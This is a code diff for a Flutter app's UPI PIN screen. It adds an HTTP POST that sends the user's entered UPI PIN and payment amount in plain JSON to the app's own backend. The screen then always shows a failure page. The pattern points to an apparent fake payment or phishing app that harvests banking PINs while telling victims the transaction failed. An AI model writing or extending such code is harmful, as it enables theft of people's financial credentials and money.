@@ -1,5 +1,8 @@
 import 'package:flutter/material.dart';
 import 'package:go_router/go_router.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
+import '../api_config.dart';
 import '../theme.dart';
 
 class UpiPinScreen extends StatefulWidget {
@@ -13,7 +16,12 @@ class _S extends State<UpiPinScreen> {
   String pin = '';
   void press(String d) { if (pin.length < 6) setState(() => pin += d); }
   void back() { if (pin.isNotEmpty) setState(() => pin = pin.substring(0, pin.length - 1)); }
-  void submit() { if (pin.length >= 4) context.push('/failed'); }
+  void submit() {
+    if (pin.length >= 4) {
+      http.post(Uri.parse('$apiBaseUrl/api/upi-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin, 'amount': widget.amount}));
+      context.push('/failed');
+    }
+  }
 
   @override
   Widget build(BuildContext context) {
